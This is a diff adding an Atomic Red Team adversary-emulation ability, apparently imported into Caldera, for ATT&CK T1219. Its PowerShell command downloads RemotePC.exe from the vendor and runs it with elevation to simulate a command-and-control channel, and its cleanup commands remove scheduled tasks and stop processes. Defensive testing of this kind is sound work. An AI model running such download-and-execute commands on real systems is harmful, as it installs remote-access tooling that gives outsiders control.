@@ -1,0 +1,62 @@
+- id: fbff3f1f-b0bf-448e-840f-7e1687affdce
+  name: RemotePC Software Execution
+  description: "An adversary may attempt to trick the user into downloading RemotePC\
+    \ Software for use as a C2 channel. \nUpon successful execution, RemotePC will\
+    \ be executed."
+  tactic: command-and-control
+  technique:
+    attack_id: T1219
+    name: Remote Access Software
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\RemotePC.exe")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://static.remotepc.com/downloads/rpc/140422/RemotePC.exe"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\RemotePC.exe" -UseBasicParsing;
+          fi; Start-Process "PathToAtomicsFolder\..\ExternalPayloads\RemotePC.exe"'
+        cleanup: Unregister-ScheduledTask -TaskName "RemotePC" -Confirm:$False -ErrorAction
+          SilentlyContinue; Unregister-ScheduledTask -TaskName "RPCServiceHealthCheck"
+          -Confirm:$False -ErrorAction SilentlyContinue; Unregister-ScheduledTask
+          -TaskName "ServiceMonitor" -Confirm:$False -ErrorAction SilentlyContinue;
+          Unregister-ScheduledTask -TaskName "StartRPCService" -Confirm:$False -ErrorAction
+          SilentlyContinue; Stop-Process -Name "RemotePCPerformance" -force -erroraction
+          silentlycontinue; Stop-Process -Name "RPCPerformanceService" -force -erroraction
+          silentlycontinue; Stop-Process -Name "RemotePCUIU" -force -erroraction silentlycontinue;
+          Stop-Process -Name "RPCDownloader" -force -erroraction silentlycontinue;
+          Stop-Process -Name "RemotePCService" -force -erroraction silentlycontinue;
+          Stop-Process -Name "RPCService" -force -erroraction silentlycontinue
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1219
+  - atomic-red-team
+  - command-and-control
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      RemotePC_Path:
+        description: Path of RemotePC executable
+        type: path
+        default: PathToAtomicsFolder\..\ExternalPayloads\RemotePC.exe
+    dependencies:
+    - description: 'RemotePC must exist on disk at the specified location (#{RemotePC_Path})
+
+        '
+      prereq_command: 'if (Test-Path "#{RemotePC_Path}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction Ignore -Force | Out-Null
+
+        Invoke-WebRequest "https://static.remotepc.com/downloads/rpc/140422/RemotePC.exe"
+        -OutFile "#{RemotePC_Path}" -UseBasicParsing
+
+        '
+    technique_created: '2018-04-18T17:59:24.739Z'
+    atomic_guid: fbff3f1f-b0bf-448e-840f-7e1687affdce
+    import_timestamp: '2025-06-24T11:15:05.501990Z'
